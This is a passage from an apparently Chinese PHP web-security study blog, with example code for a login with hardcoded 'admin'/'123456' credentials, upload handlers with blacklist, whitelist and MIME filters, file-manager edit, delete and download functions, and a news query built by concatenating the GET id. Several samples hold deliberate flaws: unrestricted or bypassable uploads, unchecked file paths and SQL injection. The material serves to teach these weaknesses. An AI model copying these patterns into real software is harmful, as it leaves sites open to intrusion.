 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//开始会话</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">//获取POST请求中的token,如果不存在则将其设置为空字符</span><br><span class="hljs-variable">$token</span>=@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;token&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-comment">//检查POST请求中的token是否与会话中的token匹配</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$token</span> !== @<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>]) &#123;<br>    <span class="hljs-comment">// 如果token不匹配，禁止访问</span><br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;HTTP/1.1 403 Forbidden&#x27;</span>);<br>    <span class="hljs-comment">//重新生成一个新的token并储存在会话中,以确保安全性</span><br>    @<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Access denied&#x27;</span>; <span class="hljs-comment">//输出拒绝访问的消息</span><br>    <span class="hljs-keyword">exit</span>; <span class="hljs-comment">//终止脚本执行</span><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//如果token匹配，则重新生成一个新的token并存储在会话中，以确保安全性</span><br>    @<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;token&#x27;</span>] = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br><br>    <span class="hljs-comment">//检查用户名和密码是否正确</span><br>    <span class="hljs-keyword">if</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]==<span class="hljs-string">&#x27;admin&#x27;</span> &amp;&amp; @<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]==<span class="hljs-string">&#x27;123456&#x27;</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;登录成功!&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;你是管理员可以访问文件管理页面！&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;登录失败！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="PHP应用-文件管理模块-显示上传-黑白名单类型过滤-访问控制"><a href="#PHP应用-文件管理模块-显示上传-黑白名单类型过滤-访问控制" class="headerlink" title="PHP应用&amp;文件管理模块&amp;显示上传&amp;黑白名单类型过滤&amp;访问控制"></a>PHP应用&amp;文件管理模块&amp;显示上传&amp;黑白名单类型过滤&amp;访问控制</h3><ol>
<li><p>文件上传</p>
<p> <img src="/assets/image-20240629202034-1kxtwj7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ul>
<li><p>前端功能性源码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 用于标识上传文件的标签 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>选择文件:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 文件输入框，允许用户选择要上传的文件 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;f&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 提交按钮，触发文件上传操作 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>上传文件<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>后端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 从上传文件数组中获取文件名</span><br><span class="hljs-variable">$name</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取文件类型</span><br><span class="hljs-variable">$type</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取文件大小</span><br><span class="hljs-variable">$size</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取临时文件名</span><br><span class="hljs-variable">$tmp_name</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取错误码</span><br><span class="hljs-variable">$error</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br><br><span class="hljs-comment">// 输出文件名</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$name</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-comment">// 输出文件类型</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$type</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-comment">// 输出文件大小</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$size</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-comment">// 输出临时文件名</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$tmp_name</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-comment">// 输出错误码</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$error</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br> <span class="hljs-comment">//如果成功将临时文件移动到指定目录，则输出文件上传成功</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>,<span class="hljs-string">&#x27;../upload/&#x27;</span>.<span class="hljs-variable">$name</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传成功!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>黑名单过滤源码</p>
<ul>
<li><p>实现源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 上传文件后缀过滤，使用黑名单机制</span><br><span class="hljs-variable">$black_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;asp&#x27;</span>, <span class="hljs-string">&#x27;jsp&#x27;</span>, <span class="hljs-string">&#x27;aspx&#x27;</span>);<br><span class="hljs-comment">// 使用 explode 函数通过点号分割文件名，获取文件后缀</span><br><span class="hljs-variable">$fenge</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$name</span>);<br><span class="hljs-comment">// 使用 end 函数获取数组中的最后一个元素，即文件后缀</span><br><span class="hljs-variable">$exts</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$fenge</span>);<br><span class="hljs-comment">// 检查文件后缀是否在黑名单中</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$exts</span>, <span class="hljs-variable">$black_ext</span>)) &#123;<br>    <span class="hljs-comment">// 如果文件后缀在黑名单中，输出非法后缀文件信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;非法后缀文件&#x27;</span> . <span class="hljs-variable">$exts</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果文件后缀不在黑名单中，移动上传的文件到指定目录</span><br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-variable">$name</span>);<br>    <span class="hljs-comment">// 输出上传成功的提示信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功！&#x27;)&lt;/script&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>白名单过滤源码</p>
<ul>
<li><p>实现源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//白名单过滤机制</span><br>**<span class="hljs-comment">// 允许上传的文件后缀白名单</span><br><span class="hljs-variable">$allow_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>);**<br><span class="hljs-comment">// 使用 explode 函数通过点号分割文件名，获取文件后缀</span><br><span class="hljs-variable">$fenge</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$name</span>);<br><span class="hljs-comment">// 使用 end 函数获取数组中的最后一个元素，即文件后缀</span><br><span class="hljs-variable">$exts</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$fenge</span>);<br><span class="hljs-comment">// 检查文件后缀是否在允许的白名单中</span><br>**<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$exts</span>, <span class="hljs-variable">$allow_ext</span>)) &#123;<br>    <span class="hljs-comment">// 如果文件后缀不在白名单中，输出非法后缀文件信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;非法后缀文件&#x27;</span> . <span class="hljs-variable">$exts</span>;**<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果文件后缀在白名单中，移动上传的文件到指定目录</span><br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-variable">$name</span>);<br>    <span class="hljs-comment">// 输出上传成功的提示信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;上传成功！&#x27;)&lt;/script&gt;&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>MIME文件类型过滤</p>
<ul>
<li><p>实现源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//MIME文件类型过滤</span><br>**<span class="hljs-comment">// 允许上传的文件 MIME 类型白名单</span><br><span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/png&#x27;</span>, <span class="hljs-string">&#x27;image/jpg&#x27;</span>, <span class="hljs-string">&#x27;image/jpeg&#x27;</span>, <span class="hljs-string">&#x27;image/gif&#x27;</span>);**<br><span class="hljs-comment">// 检查文件 MIME 类型是否在允许的白名单中</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$type</span>, <span class="hljs-variable">$allow_type</span>)) &#123;<br>    <span class="hljs-comment">// 如果文件 MIME 类型不在白名单中，输出非法文件类型信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;非法文件类型&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果文件 MIME 类型在白名单中，移动上传的文件到指定目录</span><br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-variable">$name</span>);<br>    <span class="hljs-comment">// 输出上传成功的提示信息</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;上传成功&quot;)&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li>
</ul>
</li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="PHP应用-文件管理-包含-写入-删除-下载-上传-遍历-安全"><a href="#PHP应用-文件管理-包含-写入-删除-下载-上传-遍历-安全" class="headerlink" title="PHP应用&amp;文件管理&amp;包含&amp;写入&amp;删除&amp;下载&amp;上传&amp;遍历&amp;安全"></a>PHP应用&amp;文件管理&amp;包含&amp;写入&amp;删除&amp;下载&amp;上传&amp;遍历&amp;安全</h3><p><img src="/assets/image-20240701160839-gu4ibsc.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
<ol>
<li><p>文件显示</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getlist</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>&#123;<br>    <span class="hljs-variable">$list</span> = []; <span class="hljs-comment">// 初始化文件列表数组</span><br>    <span class="hljs-variable">$hd</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$path</span>);<br>    <span class="hljs-comment">//循环读取目录中的文件名</span><br>    <span class="hljs-keyword">while</span>((<span class="hljs-variable">$file_name</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$hd</span>) )!== <span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-comment">//排除当前目录和父目录</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_name</span> != <span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$file_name</span> != <span class="hljs-string">&#x27;..&#x27;</span>) &#123;<br>            <span class="hljs-comment">//构建文件完整路径</span><br>            <span class="hljs-variable">$file_path</span> = <span class="hljs-string">&quot;<span class="hljs-subst">$path</span>/<span class="hljs-subst">$file_name</span>&quot;</span>;<br>            <span class="hljs-comment">//获取文件类型</span><br>            <span class="hljs-variable">$file_type</span> = <span class="hljs-title function_ invoke__">filetype</span>(<span class="hljs-variable">$file_path</span>);<br>            <span class="hljs-comment">//将文件信息存入列表数组</span><br>            <span class="hljs-variable">$list</span>[<span class="hljs-variable">$file_type</span>][] = <span class="hljs-keyword">array</span>( <span class="hljs-comment">//$file_type = dir 和 file $list[&#x27;dir&#x27;] 和  $list[&#x27;file&#x27;]</span><br>                <span class="hljs-string">&#x27;file_name&#x27;</span> =&gt; <span class="hljs-variable">$file_name</span>, <span class="hljs-comment">//文件名存储键值file_name</span><br>                <span class="hljs-string">&#x27;file_path&#x27;</span> =&gt; <span class="hljs-variable">$file_path</span>, <span class="hljs-comment">//文件路径存储键值file_path</span><br>                <span class="hljs-string">&#x27;file_size&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file_path</span>) / <span class="hljs-number">1024</span>), <span class="hljs-comment">//通过换算文件大小存储键值file_path</span><br>                <span class="hljs-string">&#x27;file_time&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y/m/d H:i:s&#x27;</span>, <span class="hljs-title function_ invoke__">filemtime</span>(<span class="hljs-variable">$file_path</span>)), <span class="hljs-comment">//获取文件时间并存储键值file_path</span><br>            );<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure></li>
<li><p>文件编辑、</p>
<p> <img src="/assets/image-20240701160935-io1yq4z.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;edit&#x27;</span>:<br>        <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;form name=&quot;form1&quot; method=&quot;post&quot; action=&quot;&quot;&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件名：&quot;</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件内容：&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;textarea name=&quot;code&quot; style=&quot;resize:none;&quot; rows=&quot;100&quot; cols=&quot;100&quot;&quot;&gt;&#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;&lt;/textarea&gt;&lt;br&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; id=&quot;submit&quot; value=&quot;提交&quot;&gt;&#x27;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/form&gt;&#x27;</span>;<br>        <span class="hljs-keyword">break</span>;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$f</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$path</span>/<span class="hljs-subst">$file</span>&quot;</span>,<span class="hljs-string">&#x27;w+&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$f</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li><p>文件删除</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;del&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-comment">//system(&quot;del $file&quot;);</span><br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure></li>
<li><p>文件下载</p>
<p> <img src="/assets/image-20240701161008-hrjclnq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;down&#x27;</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: application/octet-stream&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=\&quot;&quot;</span> . <span class="hljs-variable">$file</span> . <span class="hljs-string">&quot;\&quot;&quot;</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Length: &quot;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>‍</p>
<p>‍</p>
<p>‍</p>
<h3 id="PHP应用-模版引用-Smarty渲染-MVC模型-数据联动-RCE安全"><a href="#PHP应用-模版引用-Smarty渲染-MVC模型-数据联动-RCE安全" class="headerlink" title="PHP应用&amp;模版引用&amp;Smarty渲染&amp;MVC模型&amp;数据联动&amp;RCE安全"></a>PHP应用&amp;模版引用&amp;Smarty渲染&amp;MVC模型&amp;数据联动&amp;RCE安全</h3><ol>
<li><p>新闻列表</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 包含数据库配置文件</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;<br><br><span class="hljs-comment">// 从GET请求中获取id参数，如果不存在则默认为1</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>] ?? <span class="hljs-string">&#x27;1&#x27;</span>;<br><br><span class="hljs-comment">// 构建SQL查询语句</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from new where id=<span class="hljs-subst">$id</span>&quot;</span>;<br><br><span class="hljs-comment">// 执行查询并获取结果集</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<br><br><span class="hljs-comment">// 使用mysqli_fetch_row遍历结果集的每一行</span><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-comment">// 输出标题，注意：mysqli_fetch_row返回的是枚举数组，索引从0开始</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;标题: &lt;title&gt;&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&quot;&lt;/title&gt;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-comment">// 输出第二列数据</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-comment">// 输出第三列数据</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br>    <span class="hljs-comment">// 输出图片，注意：在HTML中使用$row[4]作为图片路径</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;<span class="hljs-subst">$row</span>[4]&#x27; width=&#x27;300&#x27; height=&#x27;300&#x27;&gt;&lt;/img&gt;&lt;br&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// 关闭数据库连接</span><br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$con</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li>
<li><p>自编程模板引用</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 从文件中读取HTML模板内容</span><br><span class="hljs-variable">$template</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;new.html&#x27;</span>);<br><br><span class="hljs-comment">// 使用mysqli_fetch_row遍历结果集的每一行</span><br><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-comment">// 从结果集中获取每一列的值，并存储到相应的变量中</span><br>    <span class="hljs-variable">$page_title</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];<br>    <span class="hljs-variable">$heading</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>];<br>    <span class="hljs-variable">$subheading</span> = <span class="hljs-variable">$row</span>[<span 